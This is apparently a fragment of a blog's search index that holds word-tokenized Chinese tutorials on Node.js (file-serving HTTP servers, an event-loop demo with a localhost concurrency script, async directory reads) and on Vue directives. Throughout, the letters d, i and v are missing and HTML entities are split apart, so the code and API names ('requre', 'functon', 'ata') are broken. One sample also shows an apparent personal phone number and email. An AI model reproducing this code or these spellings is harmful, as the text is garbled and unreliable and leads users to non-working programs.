")",";","res",".","en","(","ata",")",";","&","#","125",";",")",";","利用","读取","文件","，","验证","事件","环","，","即","NoeJS","的","单","进程","异步","非","阻塞","事件","驱动","模型","。","ar","http","=","requre","(","\"","http","\"",")",";","ar","fs","=","requre","(","\"","fs","\"",")",";","ar","serer","=","http",".","createSerer","(","functon","(","req",",","res",")","&","#","123",";","ar","user","=","parseInt","(","Math",".","ranom","(",")","*","10000",")",";","console",".","log","(","user",")",";","res",".","wrteHea","(","200",",","&","#","123",";","\"","Content","-","type","\"",":","\"","texthtml",";","charset","=","UTF","8","\"","&","#","125",";",")",";","fs",".","reaFle","(","\"",".","emo",".","txt","\"",",","&","#","123",";","\"","charset","\"",":","\"","utf","-","8","\"","&","#","125",";",",","functon","(","err",",","ata",")","&","#","123",";","console",".","log","(","user","+","\"","文件","读取","完毕","!","\"",")",";","res",".","en","(","ata",")",";","&","#","125",";",")",";","&","#","125",";",")",";","serer",".","lsten","(","3000",",","\"","0.0.0.0","\"",")",";","通过","访问","http",":","127.0.0.1",":","3000","我们","可以","看到","如下","54355435","文件","读取","完毕","!","现在","我们","模拟","1000","并发","mport","requestsfrom","threang","mport","Threaurl","=","\"","http",":","127.0.0.1",":","3000","\"","ef","req","(",")",":","response","=","requests",".","get","(","url",")","prnt","(","response",".","status","_","coe",")","l","=","[","]","for","n","range","(","10000",")",":","t","=","Threa","(","target","=","req",",",")","t",".","start","(",")","l",".","appen","(","t",")","[",".","jon","(",")","for","n","l","]","prnt","(","\"","完成","!","\"",")","然后","就","可以","看到","618299976182","文件","读取","完毕","!","9997","文件","读取","完毕","!","34503450","文件","读取","完毕","!","可以","发现","，","NoeJS","在","处理","当前","用户","的","时候","，","还","会","切换","到","另外","的","事件","调度","。","recurse","多级","目录","需要","递归","创建","fs",".","mkr","(","\"",".","ablumnk","\"",",","&","#","123",";","recurse",":","true","&","#","125",";",",","(","err",")","=","&","#","123",";","f","(","err",")","throw","err",";","&","#","125",";",")",";","fs","处理","异步","问题","由于","异步","性","，","下面","的","语句","会","在","回调","函数","之前","执行","所以","console",".","log","(",")","已经","把","文件夹","输出","了","，","但","事实上","for","循环","并没有","开始","遍历","三层","回调","涉及到","的","方法","http",".","createSerer","(",")","创建","一个","服务器","fs",".","rear","(",")","读取","目录","下","文件","和","文件夹","fs",".","stat","(",")","读取","文件","或者","文件夹","的","状态","ar","http","=","requre","(","\"","http","\"",")",";","ar","fs","=","requre","(","\"","fs","\"",")",";","ar","serer","=","http",".","createSerer","(","functon","(","req",",","res",")","&","#","123",";","f","(","req",".","url","=","=","\"","facon",".","co","\"",")","&","#","123",";","return",";","&","#","125",";","res",".","wrteHea","(","200",",","&","#","123",";","\"","Content","-","type","\"",":","\"","texthtml",";","charset","=","UTF","8","\"","&","#","125",";",")",";","定义","一个","变量","，","用来","存放","目录","ar","rs","=","[","]","读取",".","ablum","下","的","所有","文件",",","包括","文件","和","文件夹","fs",".","rear","(","\"",".","ablum","\"",",","functon","(","err",",","fles",")","&","#","123",";","console",".","log","(","fles",".","length",")",";","便利","这些","文件","和","文件夹",",","找到","其中","是","文件夹","的",",","将","其","放入","rs","for","(","ar","=","0",";","fles",".","length",";","+","+",")","&","#","123",";","ar","path","=","\"",".","ablum","\"","+","fles","[","]",";","fs",".","stat","(","path",",","functon","(","err",",","stats",")","&","#","123",";","f","(","stats",".","sDrectory","(",")",")","&","#","123",";","rs",".","push","(","path",")",";","&","#","125",";","&","#","125",";",")",";","&","#","125",";","由于","异步",",","上面","的","函数","执行","完了","会","立刻","执行","下面","的","函数",",","也就是说",",","上面","还","没","开始","遍历",",","下面","已经","执行","了",".","所以","这里","的","rs","是","[","]","空的","console",".","log","(","rs",")",";","&","#","125",";",")",";","res",".","en","(","\"","Success","\"",")",";","&","#","125",";",")",";","serer",".","lsten","(","3000",",","\"","0.0.0.0","\"",")",";","解决办法","：","迭","代","器","—","—","循环","强制","同步","ar","http","=","requre","(","\"","http","\"",")",";","ar","fs","=","requre","(","\"","fs","\"",")",";","ar","serer","=","http",".","createSerer","(","functon","(","req",",","res",")","&","#","123",";","f","(","req",".","url","=","=","\"","facon",".","co","\"",")","&","#","123",";","return",";","&","#","125",";","res",".","wrteHea","(","200",",","&","#","123",";","\"","Content","-","type","\"",":","\"","texthtml",";","charset","=","UTF","8","\"","&","#","125",";",")",";","定义","一个","变量","，","用来","存放","目录","ar","rs","=","[","]","读取",".","ablum","下","的","所有","文件",",","包括","文件","和","文件夹","fs",".","rear","(","\"",".","ablum","\"",",","functon","(","err",",","fles",")","&","#","123",";","定义","一个","递归","函数","functon","terator","(",")","&","#","123",";","一旦","下标","到达","数组","长度",",","则","返回","f","(","=","=","fles",".","length",")","&","#","123",";","console",".","log","(","rs",")",";","return",";","&","#","125",";","ar","path","=","\"",".","ablum","\"","+","fles","[","]",";","判断","是否","为","文件夹",",","如果","是",",","则","加入","rs","fs",".","stat","(","path",",","functon","(","err",",","stats",")","&","#","123",";","f","(","stats",".","sDrectory","(",")",")","&","#","123",";","rs",".","push","(","path",")",";","&","#","125",";","terator","(","+","1",")",";","&","#","125",";",")",";","&","#","125",";","强制","当前","下标","迭","代","完再迭","代","下一个","下标","terator","(","0",")",";","&","#","125",";",")",";","res",".","en","(","\"","Success","\"",")",";","&","#","125",";",")",";","serer",".","lsten","(","3000",",","\"","0.0.0.0","\"",")",";","静态","目录","通过","路径","访问","文件","浏览器","的","Content","-","type","能","读取","文件","正确的","格式","以便","渲染","事先","在","同级","目录","下","准备","statc","文件","，","用于","存放","html","、","css","、","jpg","等","静态","资源","ar","http","=","requre","(","\"","http","\"",")",";","ar","url","=","requre","(","\"","url","\"",")",";","ar","fs","=","requre","(","\"","fs","\"",")",";","ar","path","=","requre","(","\"","path","\"",")",";","http",".","createSerer","(","functon","(","req",",","res",")","&","#","123",";","得到","用户","的","路径","ar","pathname","=","url",".","parse","(","req",".","url",")",".","pathname",";","默认","首页","f","(","pathname","=","=","\"","\"",")","&","#","123",";","pathname","=","\"","nex",".","html","\"",";","&","#","125",";","拓展","名","ar","extname","=","path",".","extname","(","pathname",")",";","真","的","读取","这个","文件","fs",".","reaFle","(","\"",".","statc","\"","+","pathname",",","functon","(","err",",","ata",")","&","#","123",";","f","(","err",")","&","#","123",";","如果","此","文件","不存在","，","就","应","该","用","404","返回","fs",".","reaFle","(","\"",".","statc","404",".","html","\"",",","functon","(","err",",","ata",")","&","#","123",";","res",".","wrteHea","(","404",",","&","#","123",";","\"","Content","-","type","\"",":","\"","texthtml",";","charset","=","UTF","8","\"","&","#","125",";",")",";","res",".","en","(","ata",")",";","&","#","125",";",")",";","return",";","&","#","125",";",";","MIME","类型","，","就是","网页","文件","：","texthtml","jpg","文件",":","magejpg","ar","mme","=","getMme","(","extname",")",";","res",".","wrteHea","(","200",",","&","#","123",";","\"","Content","-","type","\"",":","mme","&","#","125",";",")",";","res",".","en","(","ata",")",";","&","#","125",";",")",";","&","#","125",";",")",".","lsten","(","3000",",","\"","127.0.0.1","\"",")",";","functon","getMme","(","extname",")","&","#","123",";","swtch","(","extname",")","&","#","123",";","case","\"",".","html","\"",":","return","\"","texthtml","\"",";","break",";","case","\"",".","jpg","\"",":","return","\"","magejpg","\"",";","break",";","case","\"",".","css","\"",":","return","\"","textcss","\"",";","break",";","&","#","125",";","&","#","125",";"],"url":"http://ymlog.cn/2020/04/29/NodeJS_1/","title":"NodeJS（一） 静态路由","content":"Nodejs简介​    V8引擎本身是用于Chrome浏览器的JS解释部分，但是Ryan Dahl将其搬到了服务器上，用于做服务器。\n​    浏览器和服务器类似，浏览器是发送HTTP请求，接受HTTP响应，服务器也是接受HTTP请...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E7%BC%96%E7%A8%8B/","name":"编程"},"date":"2020-04-29 19:57:22"},{"word":["Vue","是","Jaascrpt","的","框架","，","用于","简化","DOM","（","oman","obeject","m","）","操作","，","响应","式","数据","驱动","。","Vue","两种","导入","方式","：","!","-","-","开发","环境","版本","，","包含","了","有","帮助","的","命令行","警告","-","-","scrpt","src","&","#","x","3","D",";","&","quot",";","https",":","&","#","x","2","F",";","&","#","x","2","F",";","cn",".","jselr",".","net","&","#","x","2","F",";","npm","&","#","x","2","F",";","ue","&","#","x","2","F",";","st","&","#","x","2","F",";","ue",".","js","&","quot",";","&","#","x","2","F",";","scrpt","!","-","-","生产","环境","版本","，","优化","了","尺寸","和","速度","-","-","scrpt","src","&","#","x","3","D",";","&","quot",";","https",":","&","#","x","2","F",";","&","#","x","2","F",";","cn",".","jselr",".","net","&","#","x","2","F",";","npm","&","#","x","2","F",";","ue","&","quot",";","&","#","x","2","F",";","scrpt","初试","Vue","1","、","Hello","Worl","!","DOCTYPE","htmlheattleVue","基础","&","#","x","2","F",";","ttle","&","#","x","2","F",";","heaboy","&","#","x","3","D",";","&","quot",";","app","&","quot",";","&","#","123",";","&","#","123",";","message","&","#","125",";","&","#","125",";","&","#","x","2","F",";","!","-","-","开发","环境","版本","，","包含","了","有","帮助","的","命令行","警告","-","-","scrpt","src","&","#","x","3","D",";","&","quot",";","https",":","&","#","x","2","F",";","&","#","x","2","F",";","cn",".","jselr",".","net","&","#","x","2","F",";","npm","&","#","x","2","F",";","ue","&","#","x","2","F",";","st","&","#","x","2","F",";","ue",".","js","&","quot",";","&","#","x","2","F",";","scrptscrpt","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","quot",";","#","app","&","quot",";",",","ata",":","&","#","123",";","message",":","&","quot",";","Hello","Vue","!","&","quot",";","&","#","125",";","&","#","125",";",")","&","#","x","2","F",";","scrpt","&","#","x","2","F",";","boy","&","#","x","2","F",";","html","2","、","介绍","el","是","用来","设置","Vue","实例","挂载","的","元素","Vue","会","管理","el","选项","命中","的","元素","机器","内部","的","后代","可以","使用","其他","选择器","，","但是","建议","使用","ID","选择器","可以","使用","其他","的","双","标签","，","不能","使用","HTML","和","Boy","标签","3","、","ata","：","数据","对象","&","#","x","3","D",";","&","quot",";","app","&","quot",";","&","#","123",";","&","#","123",";","message","&","#","125",";","&","#","125",";","&","#","x","2","F",";","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","quot",";","#","app","&","quot",";",",","ata",":","&","#","123",";","message",":","&","quot",";","Hello","Vue","!","&","quot",";","&","#","125",";","&","#","125",";",")","4","、","字符","、","字典","、","数组","的","表示","&","#","x","3","D",";","&","quot",";","app","&","quot",";","字符","：","&","#","123",";","&","#","123",";","message","&","#","125",";","&","#","125",";","br","字典","：","&","#","123",";","&","#","123",";","contact",".","phone","&","#","125",";","&","#","125",";","br","数组","：","&","#","123",";","&","#","123",";","hobby","[","0","]","&","#","125",";","&","#","125",";","br","&","#","x","2","F",";","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","quot",";","#","app","&","quot",";",",","ata",":","&","#","123",";","message",":","&","quot",";","Hello","Vue","!","&","quot",";",",","contact",":","&","#","123",";","phone",":","&","quot",";","18151908744","&","quot",";",",","emal",":","&","quot",";","2212585023@qq.com&quot",";",",","&","#","125",";",",","hobby",":","[","&","quot",";","Reang","&","quot",";",",","&","quot",";","Sleepng","&","quot",";",",","&","quot",";","JS","&","quot",";",",","&","quot",";","Watchng","&","quot",";","]",",","&","#","125",";",",","&","#","125",";",")","Vue","指令","ue","指令","指","的","是以","-","开头","的","一组","特殊","语法","内容","绑定","，","事件","绑定","-","text","-","html","-","on","显示","切换","，","属性","绑定","-","show","-","f","-","bn","列表","循环","，","表单","元素","绑定","-","for","-","on","补充","-","moel","内容","绑定","-","text","设置","标签","的","文本","值","&","#","x","3","D",";","&","quot",";","app","&","quot",";","h","2","-","text","&","#","x","3","D",";","&","quot",";","message","&","quot",";","&","#","x","2","F",";","h","2","&","#","x","2","F",";","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","quot",";","#","app","&","quot",";",",","ata",":","&","#","123",";","message",":","&","quot",";","Hello","Vue","!","&","quot",";","&","#","125",";","&","#","125",";",")","-","html","设置","html","标签","&","#","x","3","D",";","&","quot",";","app","&","quot",";","!","-","-","如果","是","普通","文本","，","这里","的","显示","结果","和","-","text","没有","任何","不同","如果","是","HTML","文本","，","则","会","渲染","-","-","-","html","&","#","x","3","D",";","&","quot",";","message","&","quot",";","&","#","x","2","F",";","&","#","x","2","F",";","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","quot",";","#","app","&","quot",";",",","ata",":","&","#","123",";","message",":","&","quot",";","a","href","&","#","x","3","D",";","&","#","39",";","http",":","&","#","x","2","F",";","&","#","x","2","F",";","www",".","bau",".","com","&","#","39",";","Hello","Vue","!","&","#","x","2","F",";","a","&","quot",";",",","&","#","125",";","&","#","125",";",")","-","html","指令","的","作用","是","：","设置","元素","的","nnerHTML","内容","中","有","HTML","结构","会","被","解析","为","标签","-","text","指令","无论","内容","是什么","，","只","会","解析","成文","本","-","on","为","元素","绑定","事件","事件","名","不需要","写","on","指令","可以","简写","为","@","绑定","的","方法","定义","在","methos","属性","中","基本","结构","nput","type","&","#","x","3","D",";","&","quot",";","button","&","quot",";","alue","&","#","x","3","D",";","&","quot",";","事件","绑定","&","quot",";","-","on",":","事件","名","&","#","x","3","D",";","&","quot",";","方法","&","quot",";","&","#","x","2","F",";","scrpt","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","quot",";","#","app","&","quot",";",",","methos",":","&","#","123",";","方","法名",":","functon","(",")","&","#","123",";","&","#","x","2","F",";","&","#","x","2","F",";","逻辑","&","#","125",";","&","#","125",";","&","#","125",";",")","&","#","x","2","F",";","scrpt","-","on","可以","直接","替换","为","@","事件","名","有","以下","几种","类型","点击","事件","clck","鼠标","移入","monseenter","(","这","两个","好像","不","太行",")","双击","bclck","示例","：","&","#","x","3","D",";","&","quot",";","app","&","quot",";","nput","type","&","#","x","3","D",";","&","quot",";","button","&","quot",";","alue","&","#","x","3","D",";","&","quot",";","事件","绑定","&","quot",";","-","on",":","clck","&","#","x","3","D",";","&","quot",";","ot","&","quot",";","&","#","x","2","F",";","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","quot",";","#","app","&","quot",";",",","methos",":","&","#","123",";","ot",":","functon","(",")","&","#","123",";","alert","(","&","quot",";","GGGGo","!","&","quot",";",")",";","&","#","125",";","&","#","125",";",",","&","#","125",";",")","Vue","中","不","考虑","更改","DOM","元素","，","只","需要","更改","数据","，","数据","更改","之后","，","DOM","元素","会同","步","更新","。","ths","关键字","，","拿到","定义","的","数据","&","#","x","3","D",";","&","quot",";","app","&","quot",";","h","2","type","&","#","x","3","D",";","&","quot",";","text","&","quot",";","-","text","&","#","x","3","D",";","&","quot",";","foo","&","quot",";","@","clck&#x3D",";","changeFoo","&","#","x","2","F",";","h","2","&","#","x","2","F",";","scrpt","src","&","#","x","3","D",";","&","quot",";","https",":","&","#","x","2","F",";","&","#","x","2","F",";","cn",".","jselr",".","net","&","#","x","2","F",";","npm","&","#","x","2","F",";","ue","&","#","x","2","F",";","st","&","#","x","2","F",";","ue",".","js","&","quot",";","&","#","x","2","F",";","scrptscrpt","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","quot",";","#","app","&","quot",";",",","ata",":","&","#","123",";","foo",":","&","quot",";","抹茶味","冰淇淋","&","quot",";","&","#","125",";",",","methos",":","&","#","123",";","changeFoo",":","functon","(",")","&","#","123",";","&","#","x","2","F",";","&","#","x","2","F",";","console",".","log","(","ths",".","foo",")",";","ths",".","foo","+","&","#","x","3","D",";","&","quot",";","卖完","了","！","&","quot",";",";","&","#","125",";","&","#","125",";",",","&","#","125",";",")","1","、","计数器","创建","Vue","示例","时","：","el","（","挂载","点","）","；","ata","（","数据","）","，","methos","（","方法","）","-","on","指令","的","作用","就是","绑定","事件","，","简写","为","@","方法","中","通过","ths","关键字","获取","ata","中","的","数据","-","text","指令","的","作用","是","：","设置","元素","的","文本","值","，","简写","为","&","#","123",";","&","#","123",";","&","#","125",";","&","#","125",";","boy","&","#","x","3","D",";","&","quot",";","app","&","quot",";","nput","type","&","#","x","3","D",";","&","quot",";","button","&","quot",";","alue","&","#","x","3","D",";","&","quot",";","-","&","quot",";","@","clck&#x3D",";","sub","span","&","#","123",";","&","#","123",";","Nbr","&","#","125",";","&","#","125",";","&","#","x","2","F",";","span","nput","type","&","#","x","3","D",";","&","quot",";","button","&","quot",";","alue","&","#","x","3","D",";","&","quot",";","+","&","quot",";","@","clck&#x3D",";","a","&","#","x","2","F",";","!","-","-","开发","环境","版本","，","包含","了","有","帮助","的","命令行","警告","-","-","scrpt","src","&","#","x","3","D",";","&","quot",";","https",":","&","#","x","2","F",";","&","#","x","2","F",";","cn",".","jselr",".","net","&","#","x","2","F",";","npm","&","#","x","2","F",";","ue","&","#","x","2","F",";","st","&","#","x","2","F",";","ue",".","js","&","quot",";","&","#","x","2","F",";","scrptscrpt","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","quot",";","#","app","&","quot",";",",","ata",":","&","#","123",";","Nbr",":","1",",","&","#","125",";",",","methos",":","&","#","123",";","a",":","functon","(",")","&","#","123",";","ths",".","Nbr","+","&","#","x","3","D",";","1",";","&","#","125",";",",","sub",":","functon","(",")","&","#","123",";","ths",".","Nbr","-","&","#","x","3","D",";","1",";","&","#","125",";","&","#","125",";",",","&","#","125",";",")","&","#","x","2","F",";","scrpt","&","#","x","2","F",";","boy","显示","切换","-","show","根据","表达式","真假","，","切换","元素","的","显示","或","隐藏","。","原理","是","修改","元素","的","splay","属性","，","实现","显示","隐藏","指令","后面","的","内容","，","最后","都会","解析","成","布尔","值","如果","为","true","显示","元素","，","如果","为","false","则","隐藏","&","#","x","3","D",";","&","quot",";","app","&","quot",";","mg","src","&","#","x","3","D",";","&","quot",";",".","&","#","x","2","F",";","mg","&","#","x","2","F",";","orange",".","jpg","&","quot",";","alt","&","#","x","3","D",";","&","quot",";","ORANGEIMG","&","quot",";","-","show","&","#","x","3","D",";","&","quot",";","sShow","&","quot",";","heght","&","#","x","3","D",";","&","quot",";","400","px","&","quot",";","!","-","-","当","年龄","大于","18岁","的","时候","，","图片","才","会","显示","-","-","mg","src","&","#","x","3","D",";","&","quot",";",".","&","#","x","2","F",";","mg","&","#","x","2","F",";","orange",".","jpg","&","quot",";","alt","&","#","x","3","D",";","&","quot",";","ORANGEIMG","&","quot",";","-","show","&","#","x","3","D",";","&","quot",";","age","18","&","quot",";","heght","&","#","x","3","D",";","&","quot",";","400","px","&","quot",";","&","#","x","2","F",";","scrpt","src","&","#","x","3","D",";","&","quot",";","https",":","&","#","x","2","F",";","&","#","x","2","F",";","cn",".","jselr",".","net","&","#","x","2","F",";","npm","&","#","x","2","F",";","ue","&","#","x","2","F",";","st","&","#","x","2","F",";","ue",".","js","&","quot",";","&","#","x","2","F",";","scrptscrpt","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","quot",";","#","app","&","quot",";",",","ata",":","&","#","123",";","sShow",":","true",",","age",":","15",",","&","#","125",";",",","&","#","125",";",")","-","f","-","f","指令","的","作用","是","：","根据","表达式","的","真假","切换","元素","的","显示","状态","本质","是","通过","操纵","DOM","元","素来","实现","显示","状态","表达式","的","值","为","true","，","元素","存","在于","om","树中","，","为","false","，","从","om","树中","移","除","。","频繁的","切换","-","show","，","反之","使用","-","f","，","前者","切换","消耗","小","&","#","x","3","D",";","&","quot",";","app","&","quot",";","mg","src","&","#","x","3","D",";","&","quot",";",".","&","#","x","2","F",";","mg","&","#","x","2","F",";","orange",".","jpg","&","quot",";","alt","&","#","x","3","D",";","&","quot",";","ORANGEIMG","&","quot",";","-","f","&","#","x","3","D",";","&","quot",";","age","11","&","quot",";","heght","&","#","x","3","D",";","&","quot",";","400","px","&","quot",";","&","#","x","2","F",";","scrpt","src","&","#","x","3","D",";","&","quot",";","https",":","&","#","x","2","F",";","&","#","x","2","F",";","cn",".","jselr",".","net","&","#","x","2","F",";","npm","&","#","x","2","F",";","ue","&","#","x","2","F",";","st","&","#","x","2","F",";","ue",".","js","&","quot",";","&","#","x","2","F",";","scrptscrpt","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","quot",";","#","app","&","quot",";",",","ata",":","&","#","123",";","sShow",":","true",",","age",":","12",",","&","#","125",";",",","&","#","125",";",")","-","bn","-","bn","指令","的","作用","是","：","为","元素","绑定","属性","完整","写法","是","：","-","bn",":","属性","名","简写","的话","可以","直接","省略","-","bn","，","只","保留","：","属性","名","!","-","-","1","、","记得","想要","操纵","的","属性","前面","一定要","加","冒号","，","比如",":","src",",",":","class","2","、","functonal","中","想要","取","变量","需要","加","ths","3","、","显示","隐藏","class","的","语法","是",":","class","&","#","x","3","D",";","&","#","123",";","className",",","sActe","&","#","125",";","-","-","&","#","x","3","D",";","&","quot",";","app","&","quot",";","mg","-","bn",":","src","&","#","x","3","D",";","&","quot",";","mgSrc","&","quot",";","-","bn",":","alt","&","#","x","3","D",";","&","quot",";","mgAlt","&","quot",";","-","bn",":","ttle","&","#","x","3","D",";","&","quot",";","mgTtle","&","quot",";","heght","&","#","x","3","D",";","&","quot",";","400","px","&","quot",";","@","clck&#x3D",";","&","quot",";","ToRe","&","quot",";",":","class","&","#","x","3","D",";","&","quot",";","&","#","123",";","acte",":","sActe","&","#","125",";","&","quot",";","&","#","x","2","F",";","scrpt","src","&","#","x","3","D",";","&","quot",";","https",":","&","#","x","2","F",";","&","#","x","2","F",";","cn",".","jselr",".","net","&","#","x","2","F",";","npm","&","#","x","2","F",";","ue","&","#","x","2","F",";","st","&","#","x","2","F",";","ue",".","js","&","quot",";","&","#","x","2","F",";","scrptscrpt","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","#","39",";","#","app","&","#","39",";",",","ata",":","&","#","123",";","sActe",":","false",",","mgSrc",":","&","quot",";","&","#","x","2","F",";","mg","&","#","x","2","F",";","orange",".","jpg","&","quot",";",",","mgAlt",":","&","#","39",";","ue","-","logo","&","#","39",";",",","mgTtle",":","&","#","39",";","这是","你","指定","的","ttle","&","#","39",";","&","#","125",";",",","methos",":","&","#","123",";","ToRe",":","functon","(",")","&","#","123",";","ths",".","sActe","&","#","x","3","D",";","!","ths",".","sActe",";","&","#","125",";","&","#","125",";",",","&","#","125",";",")",";","&","#","x","2","F",";","scrpt","2","、","图片","切换","图片","列表","使用","数组","保存","-","bn","指令","可以","设置","元素","的","属性","-","show","和","-","f","都","可以","设置","元素","的","显示","状态","，","频繁","切换","使用","-","show","&","#","x","3","D",";","&","quot",";","app","&","quot",";","a","href","&","#","x","3","D",";","&","quot",";","jaascrpt",":","o","(","0",")","&","quot",";","@","clck&#x3D",";","&","quot",";","pre","&","quot",";","-","show","&","#","x","3","D",";","&","quot",";","nex","!","&","#","x","3","D",";","0","&","quot",";","上","一张","&","#","x","2","F",";","a","mg",":","src","&","#","x","3","D",";","&","quot",";","arrayImg","[","nex","]","&","quot",";","alt","&","#","x","3","D",";","&","quot",";","凉","了","&","quot",";","heght","&","#","x","3","D",";","&","quot",";","360","px","&","quot",";","style","&","#","x","3","D",";","&","quot",";","algn","-","tems",":","center",";","&","quot",";","a","href","&","#","x","3","D",";","&","quot",";","jaascrpt",":","o","(","0",")","&","quot",";","@","clck&#x3D",";","&","quot",";","next","&","quot",";","-","show","&","#","x","3","D",";","&","quot",";","nexarrayImg",".","length","-","1","&","quot",";","下","一张","&","#","x","2","F",";","a","&","#","x","2","F",";","scrpt","src","&","#","x","3","D",";","&","quot",";","https",":","&","#","x","2","F",";","&","#","x","2","F",";","cn",".","jselr",".","net","&","#","x","2","F",";","npm","&","#","x","2","F",";","ue","&","#","x","2","F",";","st","&","#","x","2","F",";","ue",".","js","&","quot",";","&","#","x","2","F",";","scrptscrpt","ar","app","&","#","x","3","D",";","new","Vue","(","&","#","123",";","el",":","&","#","39",";","#","app","&","#","39",";",",","ata",":","&","#","123",";","arrayImg",":","[","&","quot",";",".","&","#","x","2","F",";","mg","&","#","x","2","F",";","1",".","jpg","&","quot",";",",","&","quot",";",".","&","#","x","2","F",";","mg","&","#","x","2","F",";","2",".","jpg","&","quot",";",",","&","quot",";",".","&","#","x","2","F",";","mg","&","#","x","2","F",";","4",".","jpg","&","quot",";",",","&","quot",";",".","&","#","x","2","F",";","mg","&","#","x","2","F",";","5",".","jpg","&","quot",";",",","]",",","nex",":","0",",","&","#","125",";",",","methos",":","&","#","123",";","pre",":","functon","(",")","&","#","123",";","ths",".","nex","-","-",";","&","#","125",";",",","next",":","functon","(",")","&","#","123",";","ths",".","nex","+","+",";","&","#","125",";",",","&","#","125",";",",","&","#","125",";",")",";","&","#","x","2","F",";","scrpt","列表","循环","-","for","根据","数据","生成","列表","结构","数组","经常","和","-","for","结合","使用","语法","是","（","tem","，","nex","）","n","数据","tem","和","nex","可以","结合","其他","指令","一起","使用","数组","长度","的","更新","会同","步","到","页面","上","，","是","响应","式","的","ul","l","-","for","&","#","x","3","D",";","&","quot",";","(","tem",",","nex",")","n","arr","&","quot",";",":","ttle","&","#","x","3","D",";","&","quot",";","tem","&","quot",";","&","#","123",";","&","#","123",";","nex","&","#","125",";","&","#","125",";",".","&","#","123",";","&","#","123",";","tem","&","#","125",";","&","#","125",";","&","#","x","2","F",";","l","&","#","x","2","F",";","ul","ar","app","=","new","Vue","(","&","#","123",";","el",":","'","#","app","'",",","ata",":","&","#","123",";","arr",":","[","'","a","'",",","'","b","'",",","'","c","'",",","'","'",",","'","e","'","]",",","ct",":","&","#","123",";","name",":","\"","ZEN","\"",",","school",":","\"","UJS","\"","&","#","125",";",",","&","#","125",";","&","#","125",";",")",";","-","on","补充","事件","绑定","的","方法","写成","函数","调用","的","形式","，","可以","传入","自","定义","参数","定义","方法","时","需要","定义","形参","来","接受","传入","的","实参","事件","的","后面","跟上",".","修饰","符","可","有","对","事件","进行","限制",".","enter","可以","限制","出发","的","按键","为","回车","!","-","-","点击","Button","在","控制台","打印","参数","在","输入","栏敲","回车","alert","字符","-","-","&","#","x","3","D",";","&","quot",";","app","&","quot",";","nput","type","&","#","x","3","D",";","&","quot",";","button","&","quot",";","alue","&","#","x","3","D",";","&","quot",";","Button","&","quot",";","@","clck&#x3D",";","&","quot",";","ot","(","18151908742",",","&","#","39",";","ZEN","&","#","39",";",")","&","quot",";","nput","type","&","#","x","3","D",";","&","quot",";","text","&","quot",";","@","keyup.enter&#x3D",";","&","quot",";","sayH","&","quot",";","&","#","x","2","F",";","ar","app","=","new","Vue","(","&","#","123",";","el",":","'","#","app","'",",","ata",":","&","#","123",";","arr",":","[","'","a","'",",","'","b","'",",","'","c","'",",","'","'",",","'","e","'","]",",","&","#","125",";",",","methos",":","&","#","123",";","ot",":","functon","(","p","1",",","p","2",")","&","#","123",";","console",".","log","(","p","1",",","p","2",")",";","&","#","125",";",",","sayH",":","functon","(",")","&","#","123",";","alert","(","\"","H","Vue","!","\"",")",";","&","#","125",";",",","&","#","125",";",",","&","#","125",";",")",";","-","moel","获取","设置","表单","元素","的","值","，","双向","绑定","，","修改","任意","一方","，","另外","一个","也","会","被","修改","!","-","-","h","2","标签","的","值","会","随着","输入","框","输入","的","而","改变","，","由此","可以","得出","，","-","moel","的","改变","是","双向","的","-","-","&","#","x","3","D",";","&","quot",";","app","&","quot",";","nput","type","&","#","x","3","D",";","&","quot",";","text","&","quot",";","-","moel","&","#","x","3","D",";","&","quot",";","message","&","quot",";","h","2","&","#","123",";","&","#","123",";","message","&","#","125",";","&","#","125",";","&","#","x","2","F",";","h","2","&","#","x","2","F",";","ar","app","=","new","Vue","(","&","#","123",";","el",":","'","#","app","'",",","ata",":","&","#","123",";","message",":","\"","Vue","\"",",","&","#","125",";",",","&","#","125",";",")",";","3","、","记事本","列表","结构","可以","通过","-","for","生成","-","on","结合","事件","修饰","符","可以","对","事件","进行","限制","，","比如",".","enter","-","on","在","绑定","事件","的","时候","可以","传入","自定义","参数","通过","-","moel","可以","快速","设置","和","获取","表单","元素","的","值","VUE","是","基于","数据","的","开发","方式","，","JS","是","基于","DOM","的","开发","方式","新增","、","删除","、","统计","、","清","空","、","隐藏","增加","lst","条目","-","moe","把","需要","增加","的","信息","双向","绑定","添加","键盘","敲击","事件","响应","，","回车","调用","a","方法","-","for","遍历","too","列表","push","把","元素","添加","到","数组","&","#","x","3","D",";","&","quot",";","app","&","quot",";","nput","type","&","#","x","3","D",";","&","quot",";","text","&","quot",";","-","moel","&","#","x","3","D",";","&","quot",";","message","&","quot",";","@","keyup.enter&#x3D",";","&","quot",";","a","&","quot",";","ul","l","-","for","&","#","x","3","D",";","&","quot",";","(","tem",",","nex",")","n","tooLst","&","quot",";","&","#","123",";","&","#","123",";","nex","+","1","&","#","125",";","&","#","125",";",".","&","#","123",";","&","#","123",";","tem","&","#","125",";","&","#","125",";","&","#","x","2","F",";","l","&","#","x","2","F",";","ul","&","#","x","2","F",";","ar","app","=","new","Vue","(","&","#","123",";","el",":","\"","#","app","\"",",","ata",":","&","#","123",";","tooLst",":","[","'","起床","'",",","'","吃饭","'",",","'","睡觉","'","]",",","message",":","'","写","代码","'",",","&","#","125",";",",","methos",":","&","#","123",";","a",":","functon","(",")","&","#","123",";","ths",".","tooLst",".","push","(","ths",".","message",")",";","&","#","125",";","&","#","125",";",",","&","#","125",";",")",";","删除","删除","时","传入","下标","splce","参数","-","for","的","即时","响应","=","\"","app","\"","nput","type","=","\"","text","\"","-","moel","=","\"","message","\"","@","keyup",".","enter","=","\"","a","\"","ul","l","-","for","=","\"","(","tem",",","nex",")","n","tooLst","\"","&","#","123",";","&","#","123",";","nex","+","1","&","#","125",";","&","#","125",";",".","&","#","123","